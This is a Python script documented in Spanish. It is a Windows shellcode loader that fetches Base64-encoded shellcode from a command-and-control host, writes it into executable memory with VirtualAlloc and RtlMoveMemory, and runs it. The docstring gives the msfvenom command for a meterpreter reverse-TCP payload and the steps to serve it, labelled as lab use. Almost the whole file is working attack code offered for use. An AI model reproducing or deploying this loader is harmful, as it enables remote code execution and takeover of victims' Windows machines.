"""
shell_exec.py - Ejecución de shellcode remoto en memoria (Windows)
==================================================================
Descarga shellcode codificado en Base64 desde una URL, lo decodifica,
lo escribe en memoria ejecutable (VirtualAlloc + RtlMoveMemory) y lo
ejecuta directamente como código nativo usando ctypes en Windows.

USO TÍPICO EN LAB:
  1. Generar shellcode con msfvenom:
       msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw | base64 > shellcode.b64
  2. Servir el fichero Base64 con un servidor HTTP:
       python -m http.server 8100
  3. Ejecutar este script apuntando al servidor del lab.

ERRORES CORREGIDOS:
    1. IP personal `192.168.1.200` reemplazada por variable de entorno
       C2_HOST y puerto por C2_PORT.

REQUISITOS:
    - Python 3.x en Windows
    - (Solo biblioteca estándar + ctypes)

EJEMPLOS DE EJECUCIÓN:
    C2_HOST=192.168.0.1 C2_PORT=8100 python shell_exec.py
"""

import base64
import ctypes
import os
from urllib import request

kernel32 = ctypes.windll.kernel32

# -------------------------------------------------------------------
# Configuración — leer desde variables de entorno
# -------------------------------------------------------------------
C2_HOST = os.environ.get('C2_HOST', '192.168.0.1')   # FIX: IP personal reemplazada
C2_PORT = os.environ.get('C2_PORT', '8100')


def get_code(url):
    """
    Descarga el shellcode en Base64 desde `url` y lo decodifica a bytes.

    Args:
        url (str): URL del fichero con el shellcode codificado en Base64.

    Returns:
        bytes: Shellcode listo para ejecutar.
    """
    with request.urlopen(url) as response:
        shellcode = base64.b64decode(response.read())
    return shellcode


def write_memory(buf):
    """
    Reserva memoria ejecutable con VirtualAlloc y copia el shellcode
    con RtlMoveMemory.

    Args:
        buf (ctypes.Array): Buffer de bytes con el shellcode.

    Returns:
        ctypes.c_void_p: Puntero a la región de memoria ejecutable.
    """
    length = len(buf)

    # Configurar tipos de retorno/argumentos para mayor seguridad de tipos
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t
    )

    # MEM_COMMIT | MEM_RESERVE = 0x3000 ; PAGE_EXECUTE_READWRITE = 0x40
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr


def run(shellcode):
    """
    Ejecuta el shellcode en la memoria reservada usando ctypes.cast
    para convertir el puntero en una función llamable sin argumentos.

    Args:
        shellcode (bytes): Bytes del shellcode a ejecutar.
    """
    buffer     = ctypes.create_string_buffer(shellcode)
    ptr        = write_memory(buffer)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()


if __name__ == '__main__':
    # FIX: IP personal reemplazada por variables de entorno
    url       = f'http://{C2_HOST}:{C2_PORT}/shellcode.bin'
    shellcode = get_code(url)
    run(shellcode)
